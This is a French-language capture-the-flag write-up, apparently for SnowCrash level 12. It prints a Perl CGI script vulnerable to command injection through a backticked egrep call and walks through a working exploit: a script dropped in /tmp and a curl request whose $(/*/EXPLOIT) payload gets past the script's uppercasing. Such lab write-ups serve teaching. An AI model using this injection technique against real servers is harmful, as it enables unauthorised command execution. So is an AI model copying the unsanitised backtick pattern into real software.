Le niveau 12 comprend un script Perl tournant sur un serveur local (localhost:4646) qui traite des entrées via des requêtes HTTP GET. 
L'objectif est d'exploiter le script pour obtenir les informations d'identification du niveau suivant.

## Le Script

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

## Analyse

- Le script reçoit deux paramètres : `x` et `y`.
- Le paramètre `x` est converti en majuscules.
- Le script utilise `egrep` pour chercher dans `/tmp/xd`, permettant une injection de commande.

## Exploitation

### Étapes

1. **Créer un fichier d'exploitation** :
    ```sh
    echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
    chmod +x /tmp/EXPLOIT
    ```

2. **Envoyer l'exploitation** :
    ```sh
    curl 'http://localhost:4646/?x=$(/*/EXPLOIT)'
    ```

3. **Récupérer le flag** :
    ```sh
    cat /tmp/flag
    ```

### Exemple d'exécution

```sh
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=$(/*/EXPLOIT)'
level12@SnowCrash:~$ cat /tmp/flag
```

En suivant ces étapes, vous pouvez exploiter le script pour récupérer le mot de passe du niveau suivant. 

## Conclusion

Cette exploitation démontre une injection de commande via une entrée utilisateur non sécurisée. 
La validation et la sécurisation des entrées utilisateur sont cruciales pour prévenir de telles vulnérabilités.
